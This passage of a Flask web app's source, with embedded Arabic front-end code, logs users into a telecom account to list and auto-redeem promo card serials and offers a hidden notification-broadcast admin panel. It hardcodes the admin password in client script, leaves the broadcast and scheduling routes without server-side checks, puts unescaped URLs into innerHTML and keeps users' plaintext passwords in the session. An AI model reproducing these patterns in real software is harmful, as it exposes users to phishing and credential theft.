        <button class="btn-charge" onclick="chargeCard('${esc(p.serial)}','${esc(p.amount)}',this)"><i class="fas fa-bolt"></i>&nbsp;<span>شحن أونلاين</span></button>
        <a href="tel:${encodeURIComponent(ussd)}" class="btn-dial"><i class="fas fa-phone"></i>&nbsp;<span>شحن بالهاتف</span></a>
      </div>
    </div>`;
  }).join('');

  // Execute auto-charge
  if(autoTarget && !autoCharged){
    autoCharged = true;
    if(autoSettings.method === 'ussd'){
      // USSD auto
      setTimeout(()=>{
        const ussd = '*858*'+autoTarget.serial.replace(/\s/g,'')+'#';
        window.location.href = 'tel:'+encodeURIComponent(ussd);
        showToast('📞 جاري فتح مكالمة USSD...','ok');
      }, 600);
    } else {
      // Online auto
      setTimeout(()=>{
        const cards = wrap.querySelectorAll('.promo-card');
        cards.forEach(card=>{
          const serialEl = card.querySelector('.serial-val');
          if(serialEl && serialEl.textContent.trim()===autoTarget.serial){
            const btn = card.querySelector('.btn-charge');
            if(btn) btn.click();
          }
        });
      }, 800);
    }
  }
}

let timerInt=null;const CIRC=2*Math.PI*16;
function startTimer(cb){
  let t=7;const num=_('tnum'),prog=_('tprog');if(!num||!prog)return;
  prog.style.strokeDasharray=CIRC;prog.style.strokeDashoffset=0;clearInterval(timerInt);
  timerInt=setInterval(()=>{t--;num.textContent=Math.max(t,0);prog.style.strokeDashoffset=CIRC*(t/7);prog.style.stroke=t<=3?'#ff3333':'var(--red)';if(t<=0){clearInterval(timerInt);setTimeout(cb,200);}},1000);
}

let lastBroadcastId='';
async function getCards(){
  try{
    const r=await fetch('/fetch?t='+Date.now());const d=await r.json();
    if(d.ok){
      renderCards(d.promos,d.online);
      const bc=d.broadcast;
      if(bc?.text&&bc.id&&bc.id!==lastBroadcastId){lastBroadcastId=bc.id;fetch('/broadcast-view',{method:'POST'}).catch(()=>{});playNotifSound();showNotif(bc.title||'TALASHNY',bc.text,bc.type||'info',Math.min((bc.duration||300)*1000,8000),bc.icon||'',bc.link||'',bc.btn_label||'افتح الرابط');}
    }
  }catch{}
}
function startCycle(){getCards();startTimer(()=>startCycle());}

let notifTimer=null,currentNotifLink='';
function notifClick(){if(currentNotifLink)window.open(currentNotifLink,'_blank');}
function showNotif(title,text,type='info',duration=5000,iconUrl='',linkUrl='',btnLabel=''){
  const el=_('notifSlide'),icon=_('notifIcon'),fill=_('notifBarFill');
  const icons={info:'fa-bell',ok:'fa-circle-check',err:'fa-circle-exclamation'};
  const colors={info:'var(--red)',ok:'var(--green)',err:'#ff5555'};const color=colors[type]||'var(--red)';
  _('notifTitle').textContent=title;_('notifText').textContent=text;
  if(iconUrl){icon.innerHTML=`<img src="${iconUrl}" onerror="this.parentElement.innerHTML='<i class=\\'fas fa-bell\\'></i>'"/>`;}
  else{icon.innerHTML=`<i class="fas ${icons[type]||'fa-bell'}"></i>`;icon.style.color=color;}
  el.style.borderRightColor=color;fill.style.background=color;
  currentNotifLink=linkUrl;
  const ab=_('notifActionBtn');
  if(linkUrl){ab.href=linkUrl;_('notifBtnLabel').textContent=btnLabel||'افتح الرابط';ab.style.display='flex';el.classList.add('has-link');}
  else{ab.style.display='none';el.classList.remove('has-link');}
  fill.style.transition='none';fill.style.transform='scaleX(1)';fill.style.transformOrigin='right';
  el.classList.add('show');clearTimeout(notifTimer);
  requestAnimationFrame(()=>requestAnimationFrame(()=>{fill.style.transition=`transform ${duration}ms linear`;fill.style.transform='scaleX(0)';}));
  notifTimer=setTimeout(()=>el.classList.remove('show'),duration);
}
function playNotifSound(){try{const ctx=new(window.AudioContext||window.webkitAudioContext)();const osc=ctx.createOscillator();const gain=ctx.createGain();osc.connect(gain);gain.connect(ctx.destination);osc.type='sine';osc.frequency.setValueAtTime(880,ctx.currentTime);osc.frequency.exponentialRampToValueAtTime(440,ctx.currentTime+0.15);gain.gain.setValueAtTime(0.18,ctx.currentTime);gain.gain.exponentialRampToValueAtTime(0.001,ctx.currentTime+0.3);osc.start();osc.stop(ctx.currentTime+0.3);}catch{}}

let tapCount=0,tapTimer=null;
function handleLiveTap(){
  tapCount++;const dot=_('liveDotBtn');dot.style.transform='scale(1.8)';dot.style.boxShadow='0 0 0 6px rgba(0,200,90,.4)';
  setTimeout(()=>{dot.style.transform='';dot.style.boxShadow='';},200);
  clearTimeout(tapTimer);if(tapCount>=5){tapCount=0;openAdmin();}else tapTimer=setTimeout(()=>tapCount=0,2500);
}

const ADMIN_PW='1052003Mm$#@';let adminAuthed=false,selectedType='info',selectedDur=60;
function openAdmin(){_('adminOverlay').classList.add('open');if(!adminAuthed){_('adminAuth').style.display='';_('adminContent').classList.remove('visible');_('adminPwInput').value='';_('authErr').classList.remove('show');updatePinDots(0,'');setTimeout(()=>_('adminPwInput').focus(),350);}else loadAdminStats();}
function closeAdmin(){_('adminOverlay').classList.remove('open');}
_('adminOverlay').addEventListener('click',function(e){if(e.target===this)closeAdmin();});
function updatePinDots(len,state){const dots=_('pinDots').querySelectorAll('.pin-dot');dots.forEach((d,i)=>{d.classList.remove('filled','err');if(i<len)d.classList.add(state||'filled');});}
function checkAdminPw(){
  const val=_('adminPwInput').value;updatePinDots(Math.min(val.length,6),'filled');
  if(val===ADMIN_PW){adminAuthed=true;_('adminAuth').style.display='none';_('adminContent').classList.add('visible');loadAdminStats();}
  else{updatePinDots(6,'err');_('authErr').classList.add('show');setTimeout(()=>{updatePinDots(0,'');_('authErr').classList.remove('show');_('adminPwInput').value='';},1200);}
}
async function loadAdminStats(){try{const r=await fetch('/admin-stats');const d=await r.json();if(d.ok){_('adm-online').textContent=d.online;_('adm-today').textContent=d.today;_('adm-views').textContent=d.views??'—';}}catch{}}
function setType(t){selectedType=t;['info','ok','err'].forEach(x=>{const b=_('type-'+x);b.className='type-btn';if(x===t)b.classList.add('active-'+x);});updatePreview();}
function setDur(el,sec){selectedDur=sec;document.querySelectorAll('.dur-btn').forEach(b=>b.classList.remove('active'));el.classList.add('active');}
function updatePreview(){
  const title=_('notifTitleInput').value||'TALASHNY',text=_('notifMsgInput').value||'نص الرسالة هيظهر هنا...',iconUrl=_('notifIconInput').value.trim(),linkUrl=_('notifLinkInput').value.trim(),btnLbl=_('notifBtnInput').value.trim()||'افتح الرابط';
  const icons={info:'fa-bell',ok:'fa-circle-check',err:'fa-circle-exclamation'};
  _('prevTitle').textContent=title;_('prevText').textContent=text;
  const pw=_('prevIconWrap');if(iconUrl){pw.innerHTML=`<img src="${iconUrl}" style="width:28px;height:28px;border-radius:7px;object-fit:cover" onerror="this.outerHTML='<i class=\\'fas fa-bell\\'></i>'"/>`;}else{pw.innerHTML=`<i class="fas ${icons[selectedType]||'fa-bell'}"></i>`;}
  const pb=_('prevBtn');if(linkUrl){pb.style.display='block';_('prevBtnLabel').textContent=btnLbl;}else pb.style.display='none';
  const prev=_('notifPreview');prev.className='notif-preview';if(selectedType==='ok')prev.classList.add('type-ok');if(selectedType==='err')prev.classList.add('type-err');
}
function switchTab(tab){
  ['send','schedule','history'].forEach(t=>{_('tab-'+t)?.classList.toggle('active',t===tab);});
  _('tabSend').style.display=tab==='send'?'':'none';_('tabSchedule').style.display=tab==='schedule'?'':'none';_('tabHistory').style.display=tab==='history'?'':'none';
  if(tab==='history')loadHistory();if(tab==='schedule'){initSchedTime();loadSchedule();}
}
async function sendNotif(){
  const title=_('notifTitleInput').value.trim()||'TALASHNY',text=_('notifMsgInput').value.trim();if(!text){showToast('اكتب رسالة الأول','err');return;}
  const iconUrl=_('notifIconInput').value.trim(),linkUrl=_('notifLinkInput').value.trim(),btnLbl=_('notifBtnInput').value.trim()||'افتح الرابط';
  const btn=_('btnSendNotif');btn.disabled=true;btn.innerHTML='<i class="fas fa-spinner fa-spin"></i>&nbsp;جاري الإرسال...';
  try{
    const fd=new FormData();fd.append('text',text);fd.append('type',selectedType);fd.append('title',title);fd.append('duration',selectedDur);fd.append('icon',iconUrl);fd.append('link',linkUrl);fd.append('btn_label',btnLbl);
    const r=await fetch('/broadcast',{method:'POST',body:fd});const d=await r.json();
    if(d.ok){showToast('✅ تم إرسال الإشعار للكل','ok');closeAdmin();showNotif(title,text,selectedType,Math.min(selectedDur*1000,8000),iconUrl,linkUrl,btnLbl);}
  }catch{showToast('❌ خطأ في الإرسال','err');}
  btn.disabled=false;btn.innerHTML='<i class="fas fa-paper-plane"></i>&nbsp;إرسال للكل';
}
async function clearNotif(){
  const fd=new FormData();fd.append('text','');fd.append('type','info');fd.append('title','TALASHNY');fd.append('duration','0');
  await fetch('/broadcast',{method:'POST',body:fd});showToast('✅ تم مسح الإشعار','ok');lastBroadcastId='';
}
async function loadHistory(){
  try{
    const r=await fetch('/broadcast-history');const d=await r.json();const wrap=_('histList');
    if(!d.history?.length){wrap.innerHTML='<div class="hist-empty">لا يوجد سجل بعد</div>';return;}
    wrap.innerHTML=d.history.map(h=>`
      <div class="hist-item type-${h.type||'info'}">
        <div class="hist-item-body">
          <div class="hist-item-title">${esc(h.title||'TALASHNY')}</div>
          <div class="hist-item-text">${esc(h.text)}</div>
          <div class="hist-item-meta">
            <span class="hist-meta-chip hist-meta-time"><i class="fas fa-clock"></i>&nbsp;${esc(h.sent_at||'')}</span>
            <span class="hist-meta-chip hist-meta-views"><i class="fas fa-eye"></i>&nbsp;${h.views||0} مشاهدة</span>
          </div>
        </div>
        <div class="hist-resend" onclick='resendNotif(${JSON.stringify(h)})' title="إعادة إرسال"><i class="fas fa-rotate-right"></i></div>
      </div>`).join('');
  }catch{}
}
function resendNotif(h){_('notifTitleInput').value=h.title||'TALASHNY';_('notifMsgInput').value=h.text||'';setType(h.type||'info');updatePreview();switchTab('send');showToast('✏️ تم تحميل الإشعار','ok');}
let selectedSchedType='info';
function setSchedType(t){selectedSchedType=t;['info','ok','err'].forEach(x=>{const b=_('stype-'+x);if(!b)return;b.className='type-btn';if(x===t)b.classList.add('active-'+x);});}
function initSchedTime(){const inp=_('schedTimeInput');if(!inp)return;const now=new Date();now.setMinutes(now.getMinutes()+5);const iso=now.toISOString().slice(0,16);inp.min=iso;if(!inp.value)inp.value=iso;}
function fmtFireAt(ts){try{const d=new Date(parseFloat(ts)*1000);return d.toLocaleDateString('ar-EG',{month:'short',day:'numeric'})+' — '+d.toLocaleTimeString('ar-EG',{hour:'2-digit',minute:'2-digit'});}catch{return '—';}}
async function addSchedule(){
  const title=_('schedTitleInput').value.trim()||'TALASHNY',text=_('schedMsgInput').value.trim(),fireVal=_('schedTimeInput').value,link=_('schedLinkInput').value.trim();
  if(!text){showToast('اكتب نص الإشعار','err');return;}if(!fireVal){showToast('اختار وقت الإرسال','err');return;}
  const fireDate=new Date(fireVal),fireTs=Math.floor(fireDate.getTime()/1000),nowTs=Math.floor(Date.now()/1000);
  if(fireTs<=nowTs){showToast('الوقت لازم يكون في المستقبل','err');return;}
  const fireDisplay=fireDate.toLocaleDateString('ar-EG',{month:'short',day:'numeric'})+' '+fireDate.toLocaleTimeString('ar-EG',{hour:'2-digit',minute:'2-digit'});
  const btn=_('btnAddSched');btn.disabled=true;btn.innerHTML='<i class="fas fa-spinner fa-spin"></i>&nbsp;جاري الحفظ...';
  try{
    const fd=new FormData();fd.append('text',text);fd.append('type',selectedSchedType);fd.append('title',title);fd.append('fire_at',fireDisplay);fd.append('fire_at_ts',String(fireTs));fd.append('link',link);fd.append('duration','300');
    const r=await fetch('/schedule-add',{method:'POST',body:fd});const d=await r.json();
    if(d.ok){showToast('✅ تم الجدولة — '+fireDisplay,'ok');_('schedMsgInput').value='';_('schedLinkInput').value='';loadSchedule();}
    else showToast('❌ '+(d.error||'خطأ'),'err');
  }catch{showToast('❌ خطأ في الاتصال','err');}
  btn.disabled=false;btn.innerHTML='<i class="fas fa-calendar-plus"></i>&nbsp;جدولة الإشعار';
}
async function loadSchedule(){
  try{
    const r=await fetch('/schedule-list');const d=await r.json();const wrap=_('schedList');
    const serverTs=d.server_time||0,clientTs=Date.now()/1000,diffMin=Math.round((clientTs-serverTs)/60);
    const diffWarn=Math.abs(diffMin)>5?`<div style="font-size:.52rem;color:var(--g2);background:rgba(200,168,75,.08);border:1px solid rgba(200,168,75,.2);border-radius:8px;padding:6px 10px;margin-bottom:10px"><i class="fas fa-triangle-exclamation"></i>&nbsp;فرق التوقيت: ${diffMin>0?'+':''}${diffMin} دقيقة</div>`:'';
    const items=d.items||[];
    if(!items.length){wrap.innerHTML=diffWarn+'<div class="hist-empty">لا توجد إشعارات مجدولة</div>';return;}
    wrap.innerHTML=diffWarn+items.map(s=>`
      <div class="sched-item type-${s.type||'info'}${s.done?' done-item':''}">
        <div class="sched-item-body">
          <div class="sched-item-title">${esc(s.title||'TALASHNY')}</div>
          <div class="sched-item-text">${esc(s.text)}</div>
          <div class="sched-time-badge ${s.done?'done-badge':''}">
            ${s.done?'<i class="fas fa-check"></i> تم الإرسال':'<i class="fas fa-clock"></i> '+fmtFireAt(s.fire_at_ts)}
          </div>
        </div>
        ${!s.done?`<div class="sched-del" onclick="deleteSchedule('${esc(s.id)}')"><i class="fas fa-trash"></i></div>`:''}
      </div>`).join('');
  }catch{_('schedList').innerHTML='<div class="hist-empty">خطأ في التحميل</div>';}
}
async function deleteSchedule(id){const fd=new FormData();fd.append('id',id);await fetch('/schedule-delete',{method:'POST',body:fd});showToast('🗑️ تم الحذف','ok');loadSchedule();}
</script>
</body>
</html>"""

@app.route("/")
def index():
    return render_template_string(PAGE)

@app.route("/check")
def check():
    if session.get("logged_in"):
        sid = session.get("sid","")
        if sid: update_online(sid)
        return jsonify({"logged":True,"number":session.get("number","")})
    return jsonify({"logged":False})

@app.route("/login", methods=["POST"])
def login():
    number   = request.form.get("number","").strip()
    password = request.form.get("password","").strip()
    if not number or not password:
        return jsonify({"ok":False,"error":"الرجاء إدخال رقم الموبايل وكلمة المرور"})
    res = api_login(number, password)
    if "access_token" in res:
        sid = str(uuid.uuid4())
        session.clear()
        session["logged_in"]  = True
        session["token"]      = res["access_token"]
        session["token_exp"]  = time.time() + int(res.get("expires_in",3600)) - 120
        session["number"]     = number
        session["password"]   = password
        session["sid"]        = sid
        update_online(sid)
        return jsonify({"ok":True,"number":number})
    return jsonify({"ok":False,"error":"الرقم أو الباسورد غلط — تحقق وحاول تاني"})

@app.route("/ping")
def ping():
    sid = session.get("sid","")
    if sid: update_online(sid)
    return jsonify({"ok":True,"online":get_online_count()})

@app.route("/fetch")
def fetch():
    if not session.get("logged_in"):
        return jsonify({"ok":False})
    sid = session.get("sid","")
    if sid: update_online(sid)
    do_refresh()
    check_schedule_and_fire()
    return jsonify({
        "ok":        True,
        "promos":    api_promos(session["token"], session["number"]),
        "online":    get_online_count(),
        "broadcast": read_broadcast()
    })

@app.route("/redeem")
def redeem():
    if not session.get("logged_in"):
        return jsonify({"ok":False})
    do_refresh()
    serial = request.args.get("serial","").strip()
    amount = request.args.get("amount","?")
    code   = api_redeem(session["token"], session["number"], serial)
    if code == 200:
        record_charge(session["number"], serial, amount)
    return jsonify({"ok":code==200,"code":code})

@app.route("/logout")
def logout():
    sid = session.get("sid","")
    if sid:
        with online_lock:
            online_users.pop(sid, None)
    session.clear()
    return jsonify({"ok":True})

@app.route("/broadcast", methods=["POST"])
def broadcast():
    write_broadcast(
        request.form.get("text",""),
        request.form.get("type","info"),
        request.form.get("title","TALASHNY"),
        int(request.form.get("duration", 300)),
        request.form.get("icon",""),
        request.form.get("link",""),
        request.form.get("btn_label","افتح الرابط")
    )
    return jsonify({"ok":True})

@app.route("/broadcast-view", methods=["POST"])
def broadcast_view():
    try:
        if os.path.exists(BROADCAST_FILE):
            with open(BROADCAST_FILE,"r",encoding="utf-8") as f:
                data = json.load(f)
            if data.get("text") and data.get("expire",0) > time.time():
                data["views"] = data.get("views",0) + 1
                bid = data.get("id","")
                with open(BROADCAST_FILE,"w",encoding="utf-8") as f:
                    json.dump(data, f, ensure_ascii=False)
                if bid and os.path.exists(HISTORY_FILE):
                    with open(HISTORY_FILE,"r",encoding="utf-8") as f:
                        history = json.load(f)
                    for h in history:
                        if h.get("id") == bid:
                            h["views"] = data["views"]; break
                    with open(HISTORY_FILE,"w",encoding="utf-8") as f:
                        json.dump(history, f, ensure_ascii=False)
    except: pass
    return jsonify({"ok":True})

@app.route("/broadcast-history")
def broadcast_history():
    try:
        if not os.path.exists(HISTORY_FILE):
            return jsonify({"ok":True,"history":[]})
        with open(HISTORY_FILE,"r",encoding="utf-8") as f:
            history = json.load(f)
        return jsonify({"ok":True,"history":history})
    except:
        return jsonify({"ok":True,"history":[]})

@app.route("/admin-stats")
def admin_stats():
    today = get_today()
    with daily_lock:
        count = daily_charges.get("count",0) if daily_charges.get("date")==today else 0
    views = 0
    try:
        bc = read_broadcast()
        views = bc.get("views",0) if bc.get("text") else 0
    except: pass
    return jsonify({"ok":True,"online":get_online_count(),"today":count,"views":views})

@app.route("/schedule-add", methods=["POST"])
def schedule_add():
    try:
        fire_at_ts = float(request.form.get("fire_at_ts", 0))
        fire_at    = request.form.get("fire_at","")
        text       = request.form.get("text","").strip()
        typ        = request.form.get("type","info")
        title      = request.form.get("title","TALASHNY")
        duration   = int(request.form.get("duration",300))
        icon       = request.form.get("icon","")
        link       = request.form.get("link","")
        btn_lbl    = request.form.get("btn_label","افتح الرابط")
        if not fire_at_ts or not text:
            return jsonify({"ok":False,"error":"بيانات ناقصة"})
        if fire_at_ts <= time.time():
            return jsonify({"ok":False,"error":"الوقت لازم يكون في المستقبل"})
        items = read_schedule()
        items.append({
            "id":         str(uuid.uuid4())[:8],
            "fire_at":    fire_at,
            "fire_at_ts": fire_at_ts,
            "text":       text,
            "type":       typ,
            "title":      title,
            "duration":   duration,
            "icon":       icon,
            "link":       link,
            "btn_label":  btn_lbl,
            "done":       False
        })
        write_schedule(items)
        return jsonify({"ok":True})
    except Exception as e:
        return jsonify({"ok":False,"error":str(e)})

@app.route("/schedule-list")
def schedule_list():
    items  = read_schedule()
    cutoff = time.time() - 86400
    items  = [i for i in items if not (i.get("done") and float(i.get("fire_at_ts",0)) < cutoff)]
    write_schedule(items)
    return jsonify({"ok":True,"items":items,"server_time":time.time()})

@app.route("/schedule-delete", methods=["POST"])
def schedule_delete():
    sid   = request.form.get("id","")
    items = [i for i in read_schedule() if i.get("id") != sid]
    write_schedule(items)
    return jsonify({"ok":True})

if __name__ == "__main__":
    print("\n"+"═"*42)
    print("  TALASHNY  |  http://localhost:5000")
    print("  Admin: اضغط النقطة الخضرا 5 مرات")
    print("═"*42+"\n")
    app.run(host="0.0.0.0", port=5000, debug=False)
